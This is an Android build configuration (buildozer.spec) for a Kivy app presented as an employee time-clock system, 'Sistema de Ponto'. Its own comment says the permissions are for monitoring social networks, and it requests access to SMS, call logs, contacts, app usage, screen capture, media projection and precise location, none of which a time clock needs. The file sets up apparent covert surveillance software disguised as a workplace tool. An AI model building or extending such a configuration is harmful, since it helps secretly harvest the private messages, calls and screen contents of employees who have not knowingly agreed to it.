[app]
title = Sistema de Ponto
package.name = sistemapontomobile
package.domain = com.empresa.ponto

source.dir = .
source.include_exts = py,png,jpg,kv,atlas,txt

version = 1.0
requirements = python3,kivy,pyjnius,requests,plyer

orientation = portrait
fullscreen = 0

# Permissões para monitoramento de redes sociais
android.permissions = INTERNET,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CONTACTS,READ_SMS,READ_CALL_LOG,READ_EXTERNAL_STORAGE,ACCESS_WIFI_STATE,ACCESS_NETWORK_STATE,WRITE_EXTERNAL_STORAGE,PACKAGE_USAGE_STATS,GET_TASKS,SYSTEM_ALERT_WINDOW,READ_FRAME_BUFFER,CAPTURE_VIDEO_OUTPUT,MEDIA_PROJECTION

android.api = 31
android.minapi = 21
android.ndk = 25b
android.sdk = 31

# Configurações para monitoramento
android.archs = arm64-v8a, armeabi-v7a

[buildozer]
log_level = 2
warn_on_root = 1